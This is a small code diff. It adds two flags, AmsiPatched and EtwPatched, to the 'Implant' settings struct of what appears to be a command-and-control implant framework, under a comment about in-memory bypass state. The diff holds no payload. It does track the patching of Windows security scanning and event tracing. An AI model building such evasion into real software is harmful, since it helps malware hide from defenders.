@@ -130,6 +130,9 @@ typedef struct
             BOOL  CoffeeThreaded;
             BOOL  CoffeeVeh;
             ULONG DownloadChunkSize;
+            /* Process-wide in-memory bypass state (ARC-01) */
+            BOOL  AmsiPatched;
+            BOOL  EtwPatched;
         } Implant;
 
         struct {
